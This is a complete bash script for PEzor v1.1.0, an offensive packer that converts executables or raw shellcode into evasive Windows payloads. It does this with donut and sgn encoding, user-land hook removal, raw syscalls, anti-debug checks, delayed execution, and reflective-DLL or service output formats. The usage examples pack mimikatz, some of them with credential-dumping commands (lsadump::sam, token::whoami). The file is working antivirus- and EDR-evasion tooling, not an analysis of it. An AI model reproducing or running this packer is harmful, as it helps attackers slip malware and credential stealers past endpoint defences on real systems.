#!/usr/bin/env bash

VERSION="1.1.0"

cowsay -f dragon 'PEzor!! v'$VERSION 2>/dev/null || echo 'PEzor!! v'$VERSION
echo '---------------------------------------------------------------------------'
echo 'Read the blog post here:'
echo 'https://iwantmore.pizza/posts/PEzor.html'
echo 'Based on:'
echo 'https://github.com/TheWover/donut'
echo 'https://github.com/EgeBalci/sgn'
echo 'https://github.com/JustasMasiulis/inline_syscall'
echo 'https://github.com/CylanceVulnResearch/ReflectiveDLLRefresher'
echo '---------------------------------------------------------------------------'

CURRENT_DIR=`pwd`
INSTALL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TMP_DIR=/tmp
SGN=false
BLOB=false
IS_SHELLCODE=false
BITS=64
FORCED_BITS=false
SLEEP=0
DEBUG=false
SYSCALLS=false
UNHOOK=false
ANTIDEBUG=false
TEXT=false
SELF=false
CC=x86_64-w64-mingw32-clang
CXX=x86_64-w64-mingw32-clang++
OUTPUT_FORMAT=exe
OUTPUT_EXTENSION=exe
SOURCES=""

usage() {
    echo 'Usage Shellcode: ./PEzor.sh [-32|-64] [-debug] [-syscalls] [-unhook] [-sleep=<SECONDS>] [-sgn] [-antidebug] [-text] [-self] <shellcode.bin>'
    echo 'Usage PE:        ./PEzor.sh [-32|-64] [-debug] [-syscalls] [-unhook] [-sleep=<SECONDS>] [-sgn] [-antidebug] [-text] [-self] <executable.exe> [donut args]'
    echo ''
    echo 'USAGE

# PEzor [options...] <EXECUTABLE> [donut args...]

OPTIONS
  -h                        Show usage and exits
  -32                       Force 32-bit executable
  -64                       Force 64-bit executable
  -debug                    Generate a debug build
  -unhook                   User-land hooks removal
  -antidebug                Add anti-debug checks
  -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
  -sgn                      Encode the generated shellcode with sgn
  -text                     Store shellcode in .text section instead of .data
  -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]
  -sleep=N                  Sleeps for N seconds before unpacking the shellcode
  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll)
  [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2

EXAMPLES
  # 64-bit (self-inject)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/x64/mimikatz.exe -z 2
  # 64-bit (raw syscalls)
  $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2
  # 64-bit (reflective dll)
  $ PEzor.sh -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (service exe)
  $ PEzor.sh -format=service-exe mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (service dll)
  $ PEzor.sh -format=service-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 32-bit (self-inject)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread) and arguments for donut
  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2 "-plsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv"

# PEzor <-32|-64> [options...] <SHELLCODE>

OPTIONS
  -h                        Show usage and exits
  -32                       Force 32-bit executable
  -64                       Force 64-bit executable
  -debug                    Generate a debug build
  -unhook                   User-land hooks removal
  -antidebug                Add anti-debug checks
  -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
  -sgn                      Encode the provided shellcode with sgn
  -text                     Store shellcode in .text section instead of .data
  -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]
  -sleep=N                  Sleeps for N seconds before unpacking the shellcode
  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll)

EXAMPLES
  # 64-bit (self-inject)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
  # 64-bit (raw syscalls)
  $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 shellcode.bin
  # 64-bit (reflective dll)
  $ PEzor.sh -format=reflective-dll shellcode.bin
  # 64-bit (service exe)
  $ PEzor.sh -format=service-exe shellcode.bin
  # 64-bit (service dll)
  $ PEzor.sh -format=service-dll shellcode.bin
  # 32-bit (self-inject)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 shellcode.bin'
}

if [ $# -eq 0 ]; then
    usage
    exit 1
fi

command -v $CXX >/dev/null 2>&1 || { echo >&2 "$CXX is missing from \$PATH. Check https://github.com/tpoechtrager/wclang to learn how to install it"; exit 1; }
command -v $CC >/dev/null 2>&1 || { echo >&2 "$CC is missing from \$PATH. Check https://github.com/tpoechtrager/wclang to learn how to install it"; exit 1; }
command -v donut >/dev/null 2>&1 || { echo >&2 "donut is missing from \$PATH. Check https://github.com/TheWover/donut to learn how to install it"; exit 1; }
command -v sgn >/dev/null 2>&1 || { echo >&2 "sgn is missing from \$PATH. Check https://github.com/EgeBalci/sgn to learn how to install it"; exit 1; }

# cleanup
rm -f $TMP_DIR/*.{s,ll,cpp,donut,bin}

for arg in "$@"
do
    shift
    case "$arg" in
        -h|help)
            usage
            exit 0
            ;;
        -debug)
            DEBUG=true
            echo "[?] Debug build enabled"
            ;;
        -32)
            BITS=32
            FORCED_BITS=true
            echo "[?] Forcing 32-bit architecture"
            ;;
        -64)
            BITS=64
            FORCED_BITS=true
            echo "[?] Forcing 64-bit architecture"
            ;;
        -text)
            TEXT=true
            echo "[?] Payload will be put in .text section"
            ;;
        -self)
            SELF=true
            echo "[?] Self-executing payload"
            echo "[*] Warning: -self requires -text and supports RX shellcode only"
            ;;
        -antidebug)
            ANTIDEBUG=true
            echo "[?] Anti-debug enabled"
            ;;
        -syscalls)
            SYSCALLS=true
            echo "[?] Syscalls enabled"
            ;;
        -unhook)
            UNHOOK=true
            echo "[?] Unhook enabled"
            ;;
        -sleep=*)
            SLEEP="${arg#*=}"
            echo "[?] Waiting $SLEEP seconds before executing the payload"
            ;;
        -sgn)
            echo '[?] Final shellcode will be encoded with sgn'
            SGN=true
            ;;
        -format=*)
            OUTPUT_FORMAT="${arg#*=}"
            echo "[?] Output format: $OUTPUT_FORMAT"
            ;;
        *)
            echo "[?] Processing $arg"
            ls $arg 1>/dev/null 2>&1 || { echo "[x] ERROR: $arg doesn't exist"; exit 1; }
            BLOB=$arg
            break
            ;;
    esac
done

file $BLOB | grep -q ': data' && { IS_SHELLCODE=true; }
file $BLOB | grep -q ': DOS executable (COM)' && { IS_SHELLCODE=true; } # false positive

if [ $FORCED_BITS = false ]; then
    file $BLOB | grep -vq 'x86-64' && file $BLOB | grep -q 'PE32' && { BITS=32; }
fi

if [ $BITS -eq 32 ] && [ $SYSCALLS = true ]; then
    echo '[x] Error: cannot inline syscalls with 32bits applications'
    exit 1
fi

if [ $SELF = true ] && [ $SYSCALLS = true ]; then
    echo '[x] Error: cannot execute raw syscalls when self-executing the payload'
    exit 1
fi

if [ $SELF = true ] && [ $SGN = true ]; then
    echo '[x] Error: cannot encode the shellcode when self-executing the payload'
    exit 1
fi

if [ $IS_SHELLCODE = true ]; then
    echo '[?] Shellcode detected'
    IS_SHELLCODE=true
else
    echo -n '[?] PE detected: '
    file $BLOB
fi

rm -f $TMP_DIR/{shellcode,sleep}.cpp{,donut} $TMP_DIR/{ApiSetMap,loader}.o $TMP_DIR/*.ll

echo "unsigned int sleep_time = $SLEEP;" > $TMP_DIR/sleep.cpp

if [ $IS_SHELLCODE = false ] && [ $SGN = false ]; then
    echo '[?] Executing donut' &&
    #(donut $BLOB -f 3 -o $TMP_DIR/shellcode.cpp.donut $@ || exit 1) &&
    (donut $BLOB -f 3 -o $TMP_DIR/shellcode.cpp.donut "$@" || exit 1) &&
    echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
    if [ $TEXT = true ]; then echo '__attribute__((section (".text")))' >> $TMP_DIR/shellcode.cpp; fi &&
    cat $TMP_DIR/shellcode.cpp.donut >> $TMP_DIR/shellcode.cpp &&
    echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1
elif [ $IS_SHELLCODE = true ] && [ $SGN = false ]; then
    echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
    if [ $TEXT = true ]; then echo '__attribute__((section (".text")))' >> $TMP_DIR/shellcode.cpp; fi &&
    echo -n 'unsigned char buf[] = "' >> $TMP_DIR/shellcode.cpp &&
    od -vtx1 $BLOB | sed -e 's/^[0-9]* //' -e '$d' -e 's/^/ /' -e 's/ /\\x/g' | tr -d '\n' >> $TMP_DIR/shellcode.cpp &&
    echo '";' >> $TMP_DIR/shellcode.cpp &&
    echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1
elif [ $IS_SHELLCODE = true ] && [ $SGN = true ]; then
    echo '[?] Executing sgn' &&
    (sgn -a $BITS -c 1 -o $TMP_DIR/shellcode.bin $BLOB || exit 1) &&
    echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
    if [ $TEXT = true ]; then echo '__attribute__((section (".text")))' >> $TMP_DIR/shellcode.cpp; fi &&
    echo -n 'unsigned char buf[] = "' >> $TMP_DIR/shellcode.cpp &&
    od -vtx1 $TMP_DIR/shellcode.bin | sed -e 's/^[0-9]* //' -e '$d' -e 's/^/ /' -e 's/ /\\x/g' | tr -d '\n' >> $TMP_DIR/shellcode.cpp &&
    echo '";' >> $TMP_DIR/shellcode.cpp &&
    echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1
elif [ $IS_SHELLCODE = false ] && [ $SGN = true ]; then
    echo '[?] Executing donut' &&
    (donut $BLOB -o $TMP_DIR/shellcode.bin.donut "$@" || exit 1) &&
    echo '[?] Executing sgn' &&
    (sgn -a $BITS -c 1 -o $TMP_DIR/shellcode.bin $TMP_DIR/shellcode.bin.donut || exit 1) &&
    echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
    if [ $TEXT = true ]; then echo '__attribute__((section (".text")))' >> $TMP_DIR/shellcode.cpp; fi &&
    echo -n 'unsigned char buf[] = "' >> $TMP_DIR/shellcode.cpp &&
    od -vtx1 $TMP_DIR/shellcode.bin | sed -e 's/^[0-9]* //' -e '$d' -e 's/^/ /' -e 's/ /\\x/g' | tr -d '\n' >> $TMP_DIR/shellcode.cpp &&
    echo '";' >> $TMP_DIR/shellcode.cpp &&
    echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1
fi

case $OUTPUT_FORMAT in
    exe)
        echo '[?] Building executable'
        OUTPUT_EXTENSION=exe
        ;;
    dll)
        echo '[?] Building shared library'
        OUTPUT_EXTENSION=dll
        ;;
    reflective-dll)
        echo '[?] Building reflective shared library'
        OUTPUT_EXTENSION=reflective.dll
        ;;
    service-exe)
        echo '[?] Building service executable'
        OUTPUT_EXTENSION=service.exe
        ;;
    service-dll)
        echo '[?] Building service shared library'
        OUTPUT_EXTENSION=service.dll
        ;;
esac

CCFLAGS="-O3 -Wl,-strip-all -Wall -pedantic"
CPPFLAGS="-O3 -Wl,-strip-all -Wall -pedantic"
CXXFLAGS="-std=c++17 -static"

if [ $BITS -eq 32 ]; then
    CC=i686-w64-mingw32-clang
    CXX=i686-w64-mingw32-clang++
    CCFLAGS="$CCFLAGS -m32 -DWIN_X86"
    CPPFLAGS="$CPPFLAGS -m32 -DWIN_X86"
else
    CCFLAGS="$CCFLAGS -D_WIN64 -DWIN_X64"
    CPPFLAGS="$CPPFLAGS -D_WINX64 -DWIN_X64"
fi

if [ $DEBUG = true ]; then
    CCFLAGS="$CCFLAGS -D_DEBUG_"
    CPPFLAGS="$CPPFLAGS -D_DEBUG_"
fi

if [ $SYSCALLS = true ]; then
    CCFLAGS="$CCFLAGS -DSYSCALLS"
    CPPFLAGS="$CPPFLAGS -DSYSCALLS"
fi

if [ $UNHOOK = true ]; then
    CCFLAGS="$CCFLAGS -DUNHOOK"
    CPPFLAGS="$CPPFLAGS -DUNHOOK"
fi

if [ $ANTIDEBUG = true ]; then
    CCFLAGS="$CCFLAGS -DANTIDEBUG"
    CPPFLAGS="$CPPFLAGS -DANTIDEBUG"
fi

if [ $SELF = true ]; then
    CCFLAGS="$CCFLAGS -DSELFINJECT"
    CPPFLAGS="$CPPFLAGS -DSELFINJECT"
fi

if [ $OUTPUT_FORMAT = "dll" ]; then
    CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT"
    CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT"
elif [ $OUTPUT_FORMAT = "reflective-dll" ]; then
    CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
    CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
elif [ $OUTPUT_FORMAT = "service-exe" ]; then
    CCFLAGS="$CCFLAGS -DSERVICE_EXE"
    CPPFLAGS="$CPPFLAGS -DSERVICE_EXE"
elif [ $OUTPUT_FORMAT = "service-dll" ]; then
    CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT -DSERVICE_EXE -DSERVICE_DLL "
    CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT -DSERVICE_EXE -DSERVICE_DLL"
fi

if [ $OUTPUT_FORMAT = "reflective-dll" ]; then
    $CC $CCFLAGS -c $INSTALL_DIR/ReflectiveDLLInjection/dll/src/ReflectiveLoader.c -o $TMP_DIR/ReflectiveLoader.o
    SOURCES="$SOURCES $TMP_DIR/ReflectiveLoader.o"
fi

if [ $UNHOOK = true ]; then
    $CC $CCFLAGS -c $INSTALL_DIR/ApiSetMap.c -o $TMP_DIR/ApiSetMap.o &&
    $CC $CCFLAGS -c $INSTALL_DIR/loader.c -o $TMP_DIR/loader.o
    SOURCES="$SOURCES $TMP_DIR/ApiSetMap.o $TMP_DIR/loader.o"
fi

$CXX $CPPFLAGS $CXXFLAGS $INSTALL_DIR/*.cpp $TMP_DIR/{shellcode,sleep}.cpp $SOURCES -o $CURRENT_DIR/${BLOB%%.exe}.packed.$OUTPUT_EXTENSION &&
strip $CURRENT_DIR/${BLOB%%.exe}.packed.$OUTPUT_EXTENSION || exit 1

echo -n '[!] Done! Check '; file $CURRENT_DIR/${BLOB%%.exe}.packed.$OUTPUT_EXTENSION
